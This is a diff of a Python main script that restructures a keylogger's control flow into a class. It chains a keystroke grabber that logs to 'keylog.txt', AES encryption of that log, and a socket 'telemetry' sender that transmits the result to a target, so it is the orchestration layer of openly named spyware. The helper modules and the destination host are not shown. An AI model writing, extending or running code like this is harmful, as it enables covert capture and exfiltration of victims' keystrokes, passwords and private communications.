@@ -1,16 +1,26 @@
-from collector import key_grab
-from encription import AES_encryptor
-from telemetry import sockettelemetry
+from collector.key_grab import MainGrabber
+from encription.AES_encryptor import AESEncription
+from telemetry.sockettelemetry import TargetSocketTelemetry
 import time
 
-time_seconds=1
-# def main_function():
-#     key_grab.key_grab()
-#     time.sleep(time_seconds)
-#     AES_encryptor.encryption_function()
-#     time.sleep(time_seconds)
-#     sockettelemetry.socket_client()
-#     time.sleep(time_seconds)
-#     print("Collection Ended")
+class Main:
+    def __init__(self):
+        self.time_seconds=1
+        self.keyloger_file_path='./target_file_pool/keylog.txt'
+        self.encryption_file_path='./target_file_pool/encrypted_file.bin'
+        # self.text_file_read_path='./target_file_pool/keylog.txt'
+    def main_function(self):
+        # Key Grabber
+        grabber_instance = MainGrabber(self.keyloger_file_path)
+        grabber_instance.listner_method()
+        time.sleep(self.time_seconds)
+        # Encryption
+        encryption_instance = AESEncription(self.encryption_file_path,self.keyloger_file_path)
+        encryption_instance.encryption_method()
+        time.sleep(self.time_seconds)
+        # Telemetry
+        target_socket_telemetry_instance = TargetSocketTelemetry()
+        target_socket_telemetry_instance.sender()
 
-# main_function()
+main = Main()
+main.main_function()
